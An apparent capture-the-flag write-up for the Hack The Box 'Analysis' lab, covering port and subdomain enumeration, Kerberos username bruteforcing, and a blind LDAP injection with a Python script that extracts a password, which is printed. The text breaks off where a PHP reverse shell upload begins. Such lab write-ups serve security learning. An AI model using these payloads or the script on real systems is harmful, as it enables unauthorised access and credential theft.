# HTB - Analysis

### TL;DR
This is a Windows Server 2019 machine which hosts a web application used by a group of SOC anlaysts for network and incident monitoring purposes. Access to the web application is gained using asreproasting username bruteforce and LDAP blind injection attacks. Once inside the analysts web dashboard, the report upload feature is abused to transfer a PHP reverse shell in the server, since no upload filters are in place. For the system escalation part, a DLL hijacking vulnerability affecting the Snort IT monitoring tool is exploited.<br>

### KEYWORDS
Asreproasting, blind LDAP injection, Python scripting, PHP shell file upload, DLL hijacking.

### REFERENCES
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md<br>
https://github.com/SamJoan/ldap-brute/blob/master/wordlists/attribute_names<br>
https://book.hacktricks.xyz/pentesting-web/ldap-injection#blind-ldap-injection<br>
https://www.cvedetails.com/cve/CVE-2016-1417<br>
https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-20 17:24 EST
Host is up, received user-set (0.055s latency).
Not shown: 65083 closed tcp ports (conn-refused), 423 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3306/tcp  open  mysql            syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
33060/tcp open  mysqlx           syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49692/tcp open  unknown          syn-ack
49705/tcp open  unknown          syn-ack
52650/tcp open  unknown          syn-ack

Nmap done: 1 IP address (1 host up) scanned in 615.43 seconds
```
Looks like a Windows domain controller. Enumerate the open ports.
```markdown
> nmap $target -p53,80,88,135,139,445,464,593,636,3268,3269,3306,5985,9389,33060,47001 -sV -sC -Pn -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-20 17:42 EST
Host is up, received user-set (0.045s latency).
Scanned at 2024-01-20 17:42:18 EST for 54s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-01-20 22:43:13Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3306/tcp  open  mysql         syn-ack MySQL (unauthorized)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
33060/tcp open  mysqlx?       syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=1/20%Time=65AC4C55%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,
SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
SF:Invalid\x20message\"\x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\
SF:0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Ker
SF:beros,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x
SF:01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFour
SF:Request,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0
SF:\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDAP
SF:BindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'\
SF:x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\x05HY000"
SF:)%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x
SF:05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88
SF:'\x1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-t
SF:ns,32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16
SF:Invalid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64736/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 7365/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44409/udp): CLEAN (Failed to receive data)
|   Check 4 (port 9653/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 49s
| smb2-time: 
|   date: 2024-01-20T22:43:49
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 54.67 seconds
```
DNS enumeration.
```markdown
nslookup 
> server 10.10.11.250
Default server: 10.10.11.250
Address: 10.10.11.250#53
> analysis.htb
Server:         10.10.11.250
Address:        10.10.11.250#53

Name:   analysis.htb
Address: 10.10.11.250
```
LDAP enmeration.
```markdown
> nmap $target -p389,636 -script discovery
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-24 05:56 EST
Pre-scan script results:
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
Nmap scan report for analysis.htb (10.10.11.250)
Host is up (0.089s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=analysis,DC=htb
|       ldapServiceName: analysis.htb:dc-analysis$@ANALYSIS.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=analysis,DC=htb
|       serverName: CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=analysis,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=analysis,DC=htb
|       namingContexts: DC=analysis,DC=htb
|       namingContexts: CN=Configuration,DC=analysis,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=analysis,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=analysis,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=analysis,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 373247
|       dsServiceName: CN=NTDS Settings,CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=analysis,DC=htb
|       dnsHostName: DC-ANALYSIS.analysis.htb
|       defaultNamingContext: DC=analysis,DC=htb
|       currentTime: 20240124105741.0Z
|_      configurationNamingContext: CN=Configuration,DC=analysis,DC=htb
636/tcp open  ldapssl
Service Info: Host: DC-ANALYSIS; OS: Windows

Host script results:
|_fcrdns: FAIL (No PTR record)
| dns-brute: 
|_  DNS Brute-force hostnames: No results.

Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
```
Continue fuzzing for subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404 -t 100 -u http://analysis.htb -H "Host: FUZZ.analysis.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://analysis.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.analysis.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 81ms]
:: Progress: [4989/4989] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```
A subdomain is found. Continue fuzzing it at: http://internal.analysis.htb
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u http://internal.analysis.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 42ms]
dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 44ms]
Users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 51ms]
employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 2772ms]
Dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 101ms]
                        [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 47ms]
:: Progress: [350600/350600] :: Job [1/1] :: 419 req/sec :: Duration: [0:11:19] :: Errors: 0 ::
```
We have found 2 hidden paths at http://internal.analysis.htb/employees and http://internal.analysis.htb/users<br>
<br>
We will fuzz both of them. Start fuzzing http://internal.analysis.htb/employees
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -fc 404 -e .php,.html,.txt -u http://internal.analysis.htb/employees/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/employees/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

Login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 47ms]
login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 46ms]
:: Progress: [18852/18852] :: Job [1/1] :: 46 req/sec :: Duration: [0:01:43] :: Errors: 0 ::
```
Looks like we have found a login portal. Check it with Firefox.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/47b306b9-4314-41d6-a77c-f886de9584f8)

Take note of this finding and fuzz the other site at http://internal.analysis.htb/users
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -fc 404 -e .php,.html,.txt -u http://internal.analysis.htb/users/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 120ms]
:: Progress: [18852/18852] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```
Check the site found with Firefox, we receive an error "missing parameter".

![Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/96aa7438-935d-4b67-9cd3-ca02599d0126)

Let's find out which is that missing parameter the application is expecting. Capture the request with Burpsuite, right-click and save to file `request.txt`, then edit the text file marking the fields to fuzz with `ffuf`
```markdown
GET /users/list.php?FUZZ HTTP/1.1
Host: internal.analysis.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```
Launch `ffuf` with the text file as argument to find the parameter.
```markdwon
ffuf -c -request request.txt -request-proto http -t 100 -fs 17 -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: close
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Host: internal.analysis.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 17
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 47ms]
:: Progress: [4713/4713] :: Job [1/1] :: 278 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
```
So it seems the application is expecting parameter called `name`. Check it with Firefox.

![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8c5bf24c-f8b5-4674-b108-ed16a0ee3251)

It seems the application is taking user input in the parameter `name` and using it to launch a query against a database to fetch user data. Then the retrieved data is presented in the web page.<br>
<br>
At this point we can consider enumeration finished as we have found everything we need to begin exploitation. Wrapping up, this is what we have found:
* The host is a domain controller, and domain name is `analysis.htb`
* There is an internal subdomain with a login site for employees http://internal.analysis.htb/employees/login.php
* In the internal subdomain, there is another site at http://internal.analysis.htb/users/list.php where users can query a database by means of a parameter called `name`. According to the list of services running, this database should be MySQL or LDAP.

### USER
The employees login portal could be an entry point, but we need at least a list of valid usernames. Two options that come to mind to bruteforce usernames are asreproasting attack or a RID bruteforce. Since we do not have SMB credentials, we will opt for asreproasting.<br>
<br>
Two tools we can use to bruteforce usernames are `GetNPUsers.py` or `kerbrute`. In summary, both of send a TGT request with no pre-authentication and check the KDC reply. If the user exists, the KDC will prompt pre-authentication; if not, it will reply with an user not found message. Therefore, we can find out which usernames exist and which ones not.<br>
<br>
With `GetNPUsers.py`, launch an asproasting attack and grep the results.
```markdown
> python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py analysis.htb/ -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -dc-ip $target | grep UF_DONT_REQUIRE_PREAUTH | cut -d' ' -f 3
jdoe
ajohnson
cwilliams
wsmith
jangel
technician
```

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a25bf2bf-eec7-444f-a9de-c7be2be3f703)

It is able to dump the usernames but takes a lot of time. There is a faster tool for this purpose called `kerbrute` which essentially does the same: initiate a no-preauth TGT request and checks what the KDC replies.
```markdown
> ./kerbrute userenum --dc $target -d analysis.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/21/24 - Ronnie Flathers @ropnop

2024/01/21 11:07:33 >  Using KDC(s):
2024/01/21 11:07:33 >   10.10.11.250:88

2024/01/21 11:08:35 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/01/21 11:09:35 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/21 11:11:24 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/21 11:12:15 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/01/21 11:14:53 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/01/21 11:25:16 >  [+] VALID USERNAME:       technician@analysis.htb
2024/01/21 11:38:12 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/01/21 11:38:53 >  [+] VALID USERNAME:       AJohnson@analysis.htb
^C
```

![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/369ac410-42f5-4b8f-9966-74134dd327d6)

In any case, both methods return the same list of usernames. Testing them in the web site we discover the only username which is returning data in the `name` parameter is `technician`

![Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/de4be2b2-9788-4fb3-b6bb-7df563a8fd1e)

Now let's analyze what could be happening in the backend. It seems it is taking user input in the parameter `name` and using it to query a database which must be either MySQL or LDAP. Therefore, this parameter could be vulnerable to injections.<br>
<br>
Let's verify first if the parameter is injectable in MySQL with `sqlmap`.
```markdown
sqlmap -u "http://internal.analysis.htb/users/list.php?name=technician" --batch
```
The tool reports the parameter does not seem to be injectable in MySQL.
```markdown
[08:44:26] [WARNING] GET parameter 'name' does not seem to be injectable
[08:44:26] [CRITICAL] all tested parameters do not appear to be injectable.
```
The other option to try is LDAP injection. For this we need to find out which LDAP attributes are present in the database for user `technician`. This can be done fuzzing LDAP with Burpsuite.<br>
<br>
You can find LDAP fuzzing payloads here:<br>
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md<br>
https://book.hacktricks.xyz/pentesting-web/ldap-injection<br>
<br>
To fuzz the application, choose a payload and capture the request with Burpsuite, then send the request to intruder. In this case, the payload used is http://internal.analysis.htb/users/list.php?name=*)(%26attribute=*)<br>
<br>
Once captured and sent to intruder, we add the section marks around the attribute to fuzz.

![Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/25f010c8-297d-41a9-8bf1-681148876952)

Then load a wordlist of possible LDAP attributes. In this case, the wordlist used is this: https://github.com/SamJoan/ldap-brute/blob/master/wordlists/attribute_names<br>
<br>

![Untitled8](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e5119fc7-a165-410d-a1fe-0e4c700e5709)

Finally, according to our enumeration findings, we know the LDAP query is successful when the technician data is showed in the web site. Therefore, we will know if an LDAP attribute exists when the word "technician" is in the HTTP response. Configure the Bursuite grep match to mark HTTP responses containing this word.

![Untitled9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0234e4e9-1a98-4620-9a0f-76eef8a8b8c8)

Run the attack and verify the responses containing the word "technician" in the results.

![Untitled10](https://github.com/g1vi/AllTheWriteUps/assets/120142960/401c96e6-703b-4b15-8928-5fe17f66a98f)

We notice all the attributes found are common in Active Directory except for the attribute `description`. This is optional and somtimes is used by system admins to add addtional information such as passwords.<br>
<br>
To dump the contents of the tehnician attribute `description` we will use a blind LDAP injection attack (https://book.hacktricks.xyz/pentesting-web/ldap-injection#blind-ldap-injection). Iterating over ASCII characters, and knowing the OK/NOK criteria (in this case, whether the response contains the text "technician" or not), we can dump the field contents. The method is similar to the process of a blind SQL injection.<br>
<br>
The proposed blind LDAP injection script in Python to bruteforce the techinican `description` field is the following:
```python
#!/usr/bin/python3
import requests
import string

dictionary=string.digits+string.ascii_lowercase+string.ascii_uppercase+'@'+'.'+'#'+'$'+'%'+'&'+'*'

pattern="http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={FUZZPASS}{FUZZCHAR}*)"

password=""
run=True

print("\n[+] Running stuff...\n")

while run==True:
    run=False
    pattern="http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={FUZZPASS}{FUZZCHAR}*)"
     
    for char in dictionary:
        if char=='*':
            pattern="http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={FUZZPASS}{FUZZCHAR})"
        
        url=pattern.replace("{FUZZCHAR}",char).replace("{FUZZPASS}",password)
        
        response=requests.get(url)

        if "technician" in response.text:
            print("[+] Char found:",password+char)
            password+=char
            run=True
            break

print("\n[+] Removing trailing characters...")
if password[-1]=='*':
    password=password.rstrip('*')

print("\n[+] Password found: ",password)
```
There are 2 things to remark:
* Since we are using wildcards in the pattern URL, we have to take into account the case an asterisk (*) is used in the middle of the password.
* For the same reason, there will always be an asterisk at the end of the password found (a trailing character). Bear in mind trailing characters must be removed at the end of the password before finishing the process.

![Untitled11](https://github.com/g1vi/AllTheWriteUps/assets/120142960/291101d9-2854-4d0c-845d-25e49d64c4a2)

The `description` field looks like a password. Let's try credential `technician@analysis.htb:97NTtl*4QP96Bv` in the employees portal to login into the SOC dashboard.<br>
<br>

![Untitled12](https://github.com/g1vi/AllTheWriteUps/assets/120142960/26d88006-b2a5-4aea-a071-0123e96cc73e)

Once inside the web application, we can upload a PHP reverse shell by abusing the SOC report feature, since there is no upload filter in place. The shell used is this one:
```php
